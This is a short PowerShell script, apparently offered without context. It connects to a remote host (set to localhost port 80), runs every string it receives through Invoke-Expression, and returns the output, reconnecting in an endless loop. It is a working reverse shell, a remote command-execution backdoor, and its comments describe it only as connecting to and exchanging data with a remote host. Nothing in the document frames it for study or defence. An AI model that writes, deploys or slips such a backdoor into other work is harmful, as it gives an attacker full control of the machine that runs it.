# Define the IP address and port to connect to
$remoteIP = "localhost"
$remotePort = 80
$encoding = [System.Text.Encoding]::UTF8

# Function to connect to the remote host
function ConnectToRemoteHost {
    while ($true) {
        try {
            # Create a TCP client to connect to the remote host
            $client = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
            break
        }
        catch {
            Write-Host "Connection Failed"
        }
    }
    return $client
}

# Function to send and receive data from the remote host
function SendReceiveData($stream, $writer) {
    while ($stream.DataAvailable) {
        # Wait for a response from the remote host
        $buffer = New-Object byte[] 1024
        $bytesRead = $stream.Read($buffer, 0, 1024)
        $command = [System.Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
    
        # Display the response from the remote host
        $output = Invoke-Expression $command

        # Format the output for display
        $formattedOutput = $output | Format-Table -AutoSize | Out-String
        $formattedOutput = $formattedOutput + ":terminate"

        # Send the command to the remote host
        $writer.WriteLine($formattedOutput)
        $writer.Flush()

        $global:secondsWithoutCommand = 0
    }

    if ($secondsWithoutCommand -gt 10) {
        # Attempt to send a message to the client to check if it's still connected
        try {
            $writer.WriteLine(":keep alive")
            $writer.Flush()
            $global:secondsWithoutCommand = 0
        }
        catch [System.IO.IOException] {
            # The message failed to send, indicating that the client is no longer connected
            Write-Host "Connection Lost... retrying"
            return $true
        }
    } 

    Start-Sleep -Milliseconds (500)
    $global:secondsWithoutCommand += .5
    return $false
}

while ($true) {

    # Connect to the remote host
    $client = ConnectToRemoteHost

    # Get the stream to write outgoing data to the remote host
    $stream = $client.GetStream()

    # Create a StreamWriter object to write data to the stream
    $writer = New-Object System.IO.StreamWriter($stream, $encoding)

    $secondsWithoutCommand = 0

    while ($true) {
        $connectionFailed = SendReceiveData $stream $writer
        if ($connectionFailed) {
            $client.Close()
            break
        }
    }
}
